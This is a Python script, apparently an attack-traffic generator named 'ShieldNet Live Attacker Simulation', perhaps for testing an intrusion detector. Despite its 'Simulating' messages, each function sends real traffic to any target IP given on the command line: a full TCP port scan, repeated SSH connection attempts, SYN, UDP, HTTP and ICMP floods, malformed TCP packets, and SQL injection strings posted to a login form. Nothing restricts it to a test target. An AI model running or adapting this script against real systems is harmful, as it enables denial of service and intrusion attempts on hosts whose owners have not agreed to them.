import socket
import time
import threading
import random
import argparse
import requests
import sys

def portscan(target):
    print(f"[*] Simulating port scan on {target}...")
    for port in range(1, 65536):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.01)
            s.connect((target, port))
            s.close()
        except:
            pass

def bruteforce(target):
    print(f"[*] Simulating SSH brute force on {target}:22...")
    for _ in range(50):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            s.connect((target, 22))
            s.sendall(b"user:pass\n")
            s.close()
        except:
            pass

def synflood(target):
    try:
        from scapy.all import IP, TCP, send
        print(f"[*] Sending SYN flood to {target} (requires root)...")
        for _ in range(500):
            packet = IP(dst=target)/TCP(dport=80, flags="S")
            send(packet, verbose=False)
    except Exception as e:
        print(f"SYN flood requires Scapy and root: {e}")

def ddos(target):
    print(f"[*] Simulating DDoS flood on {target}:80...")
    for _ in range(2000):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(b"A" * 1024, (target, 80))
        except:
            pass

def httpflood(target):
    print(f"[*] Simulating HTTP flood on {target}...")
    for _ in range(600):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.1)
            s.connect((target, 80))
            s.sendall(b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n\r\n")
            s.close()
        except:
            pass

def icmpflood(target):
    try:
        from scapy.all import IP, ICMP, send
        print(f"[*] Simulating ICMP flood on {target} (requires root)...")
        for _ in range(200):
            send(IP(dst=target)/ICMP(), verbose=False)
    except Exception as e:
        print(f"ICMP flood requires Scapy and root: {e}")

def sqli(target):
    print(f"[*] Simulating SQLi attacks on {target}...")
    payloads = ["UNION SELECT", "OR '1'='1'", "--", "DROP TABLE", "xp_cmdshell"]
    for p in payloads:
        try:
            requests.post(f"http://{target}/login", data={"user": p}, timeout=1)
        except:
            pass

def malformed(target):
    try:
        from scapy.all import IP, TCP, send
        print(f"[*] Sending malformed TCP packets to {target} (requires root)...")
        packet = IP(dst=target)/TCP(dport=80, flags="FSR")
        send(packet, verbose=False)
    except Exception as e:
        print(f"Malformed packets require Scapy and root: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="ShieldNet Live Attacker Simulation")
    parser.add_argument("--target", required=True, help="IP address of the target")
    parser.add_argument("--port", type=int, default=80)
    parser.add_argument("--threads", type=int, default=12)
    parser.add_argument("--portscan", action="store_true")
    parser.add_argument("--bruteforce", action="store_true")
    parser.add_argument("--synflood", action="store_true")
    parser.add_argument("--ddos", action="store_true")
    parser.add_argument("--httpflood", action="store_true")
    parser.add_argument("--icmpflood", action="store_true")
    parser.add_argument("--sqli", action="store_true")
    parser.add_argument("--malformed", action="store_true")
    
    args = parser.parse_args()
    
    did_attack = False
    if args.portscan: portscan(args.target); did_attack = True
    if args.bruteforce: bruteforce(args.target); did_attack = True
    if args.synflood: synflood(args.target); did_attack = True
    if args.ddos: ddos(args.target); did_attack = True
    if args.httpflood: httpflood(args.target); did_attack = True
    if args.icmpflood: icmpflood(args.target); did_attack = True
    if args.sqli: sqli(args.target); did_attack = True
    if args.malformed: malformed(args.target); did_attack = True
    
    if not did_attack:
        print("Please specify an attack flag (e.g., --portscan, --bruteforce, --ddos).")
        sys.exit(1)
